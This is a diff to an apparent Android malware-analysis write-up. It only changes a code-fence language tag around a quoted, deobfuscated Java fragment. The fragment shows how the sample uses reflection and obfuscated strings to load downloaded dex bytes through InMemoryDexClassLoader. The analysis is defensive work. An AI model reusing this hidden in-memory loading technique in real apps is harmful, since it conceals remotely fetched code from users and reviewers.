@@ -215,7 +215,7 @@ public static void fetchFilesAndProcess() {
 
 As we can see, the function is fetching the files and is then it maps 'muchaspuchas' strings into application methods.
 This shows that the authors maybe wanted to obfuscate application method calls with reflection. To confirm this assumption we decided to analyze `mapMuchasStringsToMethods` function and deofuscated it in the following way
-```
+```java
     public static void mapMuchasPuchasToMethods(byte[] bArr) {
         Class inMemoryDexClassLoader = (Class) getClassInstanceByMethodName(Malicious.muchasStrings.get()[0]); // dalvik.system.InMemoryDexClassLoader
         Class cls = (Class) inMemoryDexClassLoader.getMethod(Malicious.muchasStrings.get()[2], String.class).invoke(inMemoryDexClassLoader.getConstructor((Class) getClassInstanceByMethodName(Malicious.muchasStrings.get()[11]), (Class) getClassInstanceByMethodName(Malicious.muchasStrings.get()[12])).newInstance(ByteBuffer.wrap(bArr), Class.class.getMethod(Malicious.muchasStrings.get()[1], new Class[0]).invoke(Malicious.class, new Object[0])), Malicious.muchasStrings.get()[3]);
